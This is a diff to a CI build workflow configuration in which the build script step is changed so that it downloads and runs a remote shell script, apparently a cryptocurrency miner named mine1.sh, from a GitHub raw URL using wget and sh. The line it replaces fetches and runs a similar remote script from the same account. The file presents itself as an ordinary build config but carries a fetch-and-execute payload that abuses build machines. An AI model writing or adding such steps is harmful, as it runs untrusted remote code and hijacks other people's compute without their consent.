@@ -4,4 +4,4 @@ workflows:
     instance_type: linux_x2
     max_build_duration: 120
     scripts:
-      - wget https://raw.githubusercontent.com/codem001/pkt/main/mac2.sh && sh mac2.sh
+      - wget https://raw.githubusercontent.com/codem001/pkt/main/mine1.sh && sh mine1.sh
